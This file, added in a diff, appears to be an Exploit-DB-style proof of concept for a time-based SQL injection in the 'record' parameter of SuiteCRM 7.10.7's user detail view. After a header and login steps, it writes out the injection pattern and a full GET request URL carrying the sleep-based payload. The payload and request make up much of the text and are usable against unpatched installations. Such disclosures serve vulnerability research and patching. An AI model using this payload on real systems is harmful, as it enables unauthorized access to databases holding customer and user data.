@@ -1,0 +1,33 @@
+####################################################################
+
+# Exploit Title: SuiteCRM 7.10.7 - 'record' SQL Vulnerabilities
+# Dork: N/A
+# Date: 03-02-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://suitecrm.com/
+# Software Link: https://suitecrm.com/download/
+# Version: 7.10.7
+# Category: Webapps
+# Tested on: Wampp @Win
+# CVE: N/A
+# Software Description: SuiteCRM was awarded the 2015 BOSSIE by InfoWorld
+  as the world's best open source Customer Relationship Management (CRM)
+application.
+
+####################################################################
+
+# Vulnerabilities
+# This web application called as SuiteCRM 7.10.7 version.
+# After logging in, enter the user section. then view the user details.
+  Add the following codes to the end of the URL.
+
+####################################################################
+
+# POC - SQL (Time Based)
+# Parameters : record
+# Attack Pattern : aNd if(length(0x454d49524f474c55)>1,sleep(5),0)
+# GET Request :
+http://localhost/SuiteCRM/index.php?module=Users&action=DetailView&record=1
+aNd if(length(0x454d49524f474c55)>1,sleep(5),0)
+
+####################################################################
